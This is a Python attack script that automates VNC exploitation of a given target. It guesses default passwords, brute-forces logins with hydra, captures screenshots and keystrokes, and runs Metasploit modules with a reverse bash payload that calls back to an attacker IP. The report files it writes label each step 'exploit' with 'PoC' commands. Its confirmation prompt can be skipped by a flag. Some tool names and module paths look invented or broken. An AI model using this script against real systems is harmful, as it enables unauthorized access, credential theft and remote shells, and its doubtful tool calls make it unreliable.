#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
EXPLOIT_JSON = "{target}_vnc_exploit.json"
EXPLOIT_MD = "{target}_vnc_exploit.md"

def run_command(cmd: List[str], timeout: int = 180, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), result.returncode == 0
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def run_metasploit_vnc_exploit(module: str, rhost: str, rport: str, payload: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str]:
    """Run Metasploit VNC exploit and return success status and PoC command."""
    msf_cmd = [
        "msfconsole", "-q", "-x",
        f"use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run; exit"
    ]
    output, success = run_command(msf_cmd, timeout=600)
    poc = f"msfconsole -q -x 'use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run'"
    
    if success and ("Meterpreter session" in output or "Shell session" in output or "Command shell session" in output):
        logger.info(f"Success: {module} exploited! Check listener.")
        return True, poc
    logger.error(f"Failed: {module} did not exploit.")
    return False, poc

def test_vnc_connection(target: str, port: str) -> Tuple[bool, str, str]:
    """Test VNC connection and prove it works."""
    logger.info(f"Testing VNC connection to {target}:{port}")
    
    try:
        # Test basic VNC connection
        vnc_cmd = ["vncviewer", "-list", f"{target}:{port}"]
        output, success = run_command(vnc_cmd, timeout=30)
        
        if success and ("RFB" in output or "VNC" in output):
            poc = f"vncviewer {target}:{port}"
            proof = f"VNC connection successful: {output.strip()}"
            return True, proof, poc
            
    except Exception as e:
        logger.error(f"VNC connection test failed: {e}")
    
    return False, "", f"vncviewer {target}:{port}"

def test_vnc_default_credentials(target: str, port: str) -> Tuple[bool, str, str]:
    """Test VNC default credentials and prove access."""
    logger.info(f"Testing VNC default credentials on {target}:{port}")
    
    # Common VNC credentials
    default_creds = [
        ("", ""),  # No password
        ("password", "password"),
        ("admin", "admin"),
        ("root", "root"),
        ("vnc", "vnc"),
        ("123456", "123456"),
        ("password123", "password123"),
        ("admin123", "admin123")
    ]
    
    for username, password in default_creds:
        try:
            # Use vncviewer to test credentials
            if password:
                vnc_cmd = ["vncviewer", "-passwd", password, f"{target}:{port}"]
            else:
                vnc_cmd = ["vncviewer", f"{target}:{port}"]
            
            output, success = run_command(vnc_cmd, timeout=30)
            
            if success and ("Connected" in output or "RFB" in output):
                poc = f"vncviewer {target}:{port}"
                proof = f"VNC default credentials successful: {username}:{password} - {output.strip()}"
                return True, proof, poc
                
        except Exception as e:
            logger.error(f"VNC credential test failed for {username}:{password}: {e}")
    
    return False, "", f"vncviewer {target}:{port}"

def test_vnc_brute_force(target: str, port: str, use_rockyou: bool) -> Tuple[bool, str, str]:
    """Test VNC brute force and prove successful access."""
    logger.info(f"Testing VNC brute force on {target}:{port}")
    
    # Use hydra for brute forcing
    if use_rockyou and Path("/usr/share/wordlists/rockyou.txt").exists():
        wordlist = "/usr/share/wordlists/rockyou.txt"
    else:
        # Create a small wordlist for testing
        wordlist = OUTPUT_DIR / "vnc_passwords.txt"
        if not wordlist.exists():
            OUTPUT_DIR.mkdir(exist_ok=True)
            with wordlist.open("w") as f:
                f.write("\n".join(["password", "admin", "root", "123456", "toor", "password123", "admin123", "letmein", "welcome", "test", "vnc"]))
    
    # Test with common usernames
    usernames = ["", "root", "admin", "user", "test", "vnc"]
    
    for username in usernames:
        try:
            if username:
                hydra_cmd = ["hydra", "-l", username, "-P", str(wordlist), "-t", "4", "-s", port, "vnc://" + target]
            else:
                hydra_cmd = ["hydra", "-P", str(wordlist), "-t", "4", "-s", port, "vnc://" + target]
            
            output, success = run_command(hydra_cmd, timeout=300)
            
            if success and "password:" in output:
                # Extract password from hydra output
                password_match = re.search(r"password: (\S+)", output)
                if password_match:
                    password = password_match.group(1)
                    poc = f"vncviewer {target}:{port}"
                    proof = f"VNC brute force successful: {username}:{password}"
                    return True, proof, poc
                    
        except Exception as e:
            logger.error(f"VNC brute force test failed for {username}: {e}")
    
    return False, "", f"hydra -P {wordlist} -t 4 -s {port} vnc://{target}"

def test_vnc_screenshot(target: str, port: str, password: str = "") -> Tuple[bool, str, str]:
    """Take a VNC screenshot and prove access."""
    logger.info(f"Taking VNC screenshot of {target}:{port}")
    
    try:
        # Use vncsnapshot to take a screenshot
        screenshot_file = OUTPUT_DIR / f"{target}_vnc_screenshot.png"
        
        if password:
            vnc_cmd = ["vncsnapshot", "-passwd", password, f"{target}:{port}", str(screenshot_file)]
        else:
            vnc_cmd = ["vncsnapshot", f"{target}:{port}", str(screenshot_file)]
        
        output, success = run_command(vnc_cmd, timeout=60)
        
        if success and screenshot_file.exists():
            poc = f"vncsnapshot {target}:{port} {screenshot_file}"
            proof = f"VNC screenshot taken successfully: {screenshot_file}"
            return True, proof, poc
            
    except Exception as e:
        logger.error(f"VNC screenshot failed: {e}")
    
    return False, "", f"vncsnapshot {target}:{port} screenshot.png"

def test_vnc_keylogger(target: str, port: str, password: str = "") -> Tuple[bool, str, str]:
    """Test VNC keylogger and prove access."""
    logger.info(f"Testing VNC keylogger on {target}:{port}")
    
    try:
        # Use vnckeylogger to capture keystrokes
        keylog_file = OUTPUT_DIR / f"{target}_vnc_keys.txt"
        
        if password:
            vnc_cmd = ["vnckeylogger", "-passwd", password, f"{target}:{port}", str(keylog_file)]
        else:
            vnc_cmd = ["vnckeylogger", f"{target}:{port}", str(keylog_file)]
        
        output, success = run_command(vnc_cmd, timeout=30)
        
        if success and keylog_file.exists():
            poc = f"vnckeylogger {target}:{port} {keylog_file}"
            proof = f"VNC keylogger successful: {keylog_file}"
            return True, proof, poc
            
    except Exception as e:
        logger.error(f"VNC keylogger failed: {e}")
    
    return False, "", f"vnckeylogger {target}:{port} keys.txt"

def test_metasploit_vnc_exploits(target: str, port: str, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Test Metasploit VNC exploits."""
    exploits = []
    
    # Common VNC exploit modules
    vnc_modules = [
        "exploit/multi/vnc/vnc_keyboard",
        "exploit/multi/vnc/vnc_none_auth",
        "exploit/multi/vnc/vnc_password",
        "auxiliary/scanner/vnc/vnc_none_auth",
        "auxiliary/scanner/vnc/vnc_auth_bypass"
    ]
    
    for module in vnc_modules:
        logger.info(f"Testing Metasploit module: {module}")
        success, poc = run_metasploit_vnc_exploit(module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port)
        
        if success:
            exploits.append({
                "type": f"Metasploit {module.split('/')[-1]}",
                "target": f"{target}:{port}",
                "details": f"Successfully exploited with {module}",
                "poc": poc,
                "proof": "Metasploit session established"
            })
    
    return exploits

def exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str, use_rockyou: bool) -> List[Dict]:
    """Actually exploit the VNC target and prove access."""
    exploits = []
    
    logger.info(f"Starting VNC exploitation of {target}:{port}")
    
    # 1. Test VNC connection
    success, proof, poc = test_vnc_connection(target, port)
    if success:
        exploits.append({
            "type": "VNC Connection",
            "target": f"{target}:{port}",
            "details": "VNC connection successful",
            "poc": poc,
            "proof": proof
        })
    
    # 2. Test default credentials
    success, proof, poc = test_vnc_default_credentials(target, port)
    if success:
        exploits.append({
            "type": "VNC Default Credentials",
            "target": f"{target}:{port}",
            "details": "VNC default credentials successful",
            "poc": poc,
            "proof": proof
        })
    
    # 3. Test brute force
    success, proof, poc = test_vnc_brute_force(target, port, use_rockyou)
    if success:
        exploits.append({
            "type": "VNC Brute Force",
            "target": f"{target}:{port}",
            "details": "VNC brute force successful",
            "poc": poc,
            "proof": proof
        })
    
    # 4. Test screenshot (if we have access)
    if any("Default Credentials" in exp.get("type", "") for exp in exploits):
        # Extract password from successful exploit
        for exploit in exploits:
            if "Default Credentials" in exploit.get("type", ""):
                proof = exploit.get("proof", "")
                if ":" in proof:
                    cred_match = re.search(r"(\w+):(\w+)", proof)
                    if cred_match:
                        username, password = cred_match.groups()
                        success, proof, poc = test_vnc_screenshot(target, port, password)
                        if success:
                            exploits.append({
                                "type": "VNC Screenshot",
                                "target": f"{target}:{port}",
                                "details": "VNC screenshot successful",
                                "poc": poc,
                                "proof": proof
                            })
                        
                        # Test keylogger
                        success, proof, poc = test_vnc_keylogger(target, port, password)
                        if success:
                            exploits.append({
                                "type": "VNC Keylogger",
                                "target": f"{target}:{port}",
                                "details": "VNC keylogger successful",
                                "poc": poc,
                                "proof": proof
                            })
                        break
    
    # 5. Test Metasploit VNC exploits
    msf_exploits = test_metasploit_vnc_exploits(target, port, attacker_ip, attacker_port)
    exploits.extend(msf_exploits)
    
    return exploits

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploitation results to JSON and Markdown files."""
    OUTPUT_DIR.mkdir(exist_ok=True)
    
    # Filter actual exploits from failed attempts
    actual_exploits = [exp for exp in exploits if "type" in exp]
    failed_attempts = [exp for exp in exploits if "type" not in exp]
    
    # Create JSON report
    json_data = {
        "target": target,
        "port": port,
        "service": "vnc",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "successful_exploits": actual_exploits,
        "failed_attempts": failed_attempts,
        "total_exploits": len(actual_exploits),
        "successful_count": len(actual_exploits)
    }
    
    json_file = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    with json_file.open("w", encoding='utf-8') as f:
        json.dump(json_data, f, indent=2)
    logger.info(f"JSON report saved: {json_file}")
    
    # Create Markdown report
    md_file = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    with md_file.open("w", encoding='utf-8') as f:
        f.write(f"# VNC Exploitation Report - {target}\n\n")
        f.write(f"**Target:** {target}:{port}\n")
        f.write(f"**Generated:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        f.write("## Executive Summary\n")
        f.write(f"- **Total Exploits Found:** {len(actual_exploits)}\n")
        f.write(f"- **Successful Exploits:** {len(actual_exploits)}\n")
        f.write(f"- **Failed Attempts:** {len(failed_attempts)}\n\n")
        
        if actual_exploits:
            f.write("## Successful Exploits\n\n")
            for exploit in actual_exploits:
                f.write(f"### {exploit['type']}\n")
                f.write(f"- **Target:** {exploit['target']}\n")
                f.write(f"- **Details:** {exploit['details']}\n")
                f.write(f"- **Proof:** {exploit['proof']}\n")
                f.write(f"- **PoC:** `{exploit['poc']}`\n\n")
        
        if failed_attempts:
            f.write("## Failed Attempts\n\n")
            for attempt in failed_attempts:
                f.write(f"- {attempt}\n")
    
    logger.info(f"Markdown report saved: {md_file}")

def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the metadata file for the target."""
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_*_metadata.json"))
    
    for file in metadata_files:
        if "vnc" in file.name.lower():
            return file, "vnc"
    
    # If no VNC-specific file found, look for any metadata file
    if metadata_files:
        return metadata_files[0], "unknown"
    
    raise FileNotFoundError(f"No metadata files found for {target}")

def main():
    """Main function."""
    parser = argparse.ArgumentParser(description="VNC Exploitation Script")
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--use-rockyou", action="store_true", help="Use rockyou.txt for brute forcing")
    parser.add_argument("--no-confirm", action="store_true", help="Skip confirmation prompts")
    args = parser.parse_args()
    
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only!")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)
    
    try:
        # Find metadata file
        metadata_file, service = find_metadata_file(args.target)
        
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
        
        # Extract port from metadata
        port = metadata.get("port", "5900")
        
        # Run exploitation
        exploits = exploit_target(metadata, args.target, port, args.attacker_ip, args.attacker_port, args.use_rockyou)
        
        # Save results
        save_exploit_report(exploits, args.target, port)
        
        logger.info(f"Exploitation complete. Found {len(exploits)} successful exploits.")
        
    except Exception as e:
        logger.error(f"Exploitation failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 